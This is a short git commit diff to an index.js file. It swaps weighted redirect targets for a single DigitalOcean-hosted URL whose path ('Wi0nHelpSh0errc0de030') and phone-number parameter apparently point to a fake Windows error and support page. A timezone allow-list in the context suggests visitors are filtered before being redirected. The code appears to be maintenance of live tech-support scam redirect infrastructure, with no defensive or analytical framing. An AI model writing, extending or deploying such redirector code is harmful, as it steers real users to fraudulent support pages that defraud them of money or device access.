e4cd1dd3420e2acded6deb2063f341f93d13d9db
paalakash <palaksh452@gmail.com>
2026-06-17 05:47:53 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,9 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seashell-app-d6a7h.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-900-934", weight: 0.5 },
-    { url: "https://seashell-app-d6a7h.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-900-934", weight: 0.5 }
-
+    { url: "https://lobster-app-ljem7.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-900-934", weight: 1.0 }
+    
 ];
 
 // --- Pre-Compilation Cache Layer ---
